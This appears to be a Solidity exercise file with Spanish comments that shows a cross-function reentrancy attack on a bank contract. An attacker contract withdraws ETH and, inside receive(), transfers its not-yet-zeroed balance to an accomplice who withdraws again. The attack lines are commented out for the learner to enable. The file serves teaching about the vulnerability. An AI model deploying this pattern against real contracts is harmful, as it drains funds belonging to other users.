// SPDX-License-Identifier: MIT
pragma solidity 0.8.38;

// ¿Qué? El atacante de una reentrancy entre funciones: al recibir el ETH de `withdraw`, mueve su
//   saldo, todavía intacto, a un cómplice con `transfer`. Después el cómplice retira otra vez.
// ¿Para qué? Ver que proteger una función sola no basta: la otra lee el mismo saldo.
interface IBank {
    function deposit() external payable;
    function transfer(address to, uint256 amount) external;
    function withdraw() external;
    function balanceOf(address account) external view returns (uint256);
}

contract CrossAttacker {
    IBank public immutable BANK;
    address public immutable ACCOMPLICE;

    constructor(IBank bank, address accomplice) {
        BANK = bank;
        ACCOMPLICE = accomplice;
    }

    /// @notice Deposita lo que envías y retira.
    function attack() external payable {
        BANK.deposit{value: msg.value}();
        BANK.withdraw();
    }

    // PASO 4: durante el envío, pasar el saldo al cómplice.
    // Descomenta la línea que empieza con `//> `. Sin ella, `receive` solo acepta el ETH.
    receive() external payable {
        //> uint256 balance = BANK.balanceOf(address(this));
        //> if (balance > 0) BANK.transfer(ACCOMPLICE, balance);
    }
}
